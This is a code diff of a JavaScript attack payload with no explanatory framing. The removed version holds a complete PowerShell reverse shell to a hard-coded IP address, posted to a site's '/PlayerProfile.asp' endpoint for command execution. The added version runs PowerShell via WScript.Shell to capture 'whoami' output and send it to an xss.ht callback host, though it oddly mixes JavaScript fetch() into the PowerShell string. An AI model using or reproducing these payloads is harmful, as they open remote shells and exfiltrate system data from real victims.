@@ -1,7 +1,3 @@
-
-// Reverse Shell JS Payload (via PowerShell)
-var cmd = 'powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient(114.76.63.234,21);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\'PS \\' + (pwd).Path + \\'> \\';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
-var xhr = new XMLHttpRequest();
-xhr.open('POST', '/PlayerProfile.asp', false);  // Or any POST endpoint on the site
-xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-xhr.send('cmd=' + encodeURIComponent(cmd));  // Executes via a p
+var cmd = 'powershell -nop -exec bypass -c "whoami | Out-File -Encoding ascii C:\\temp\\whoami.txt; $content = Get-Content C:\\temp\\whoami.txt; fetch(\\'http://whoami.cantdothis2.xss.ht/\\' + $content)"';
+var shell = new ActiveXObject("WScript.Shell");
+shell.Run(cmd, 0, false);
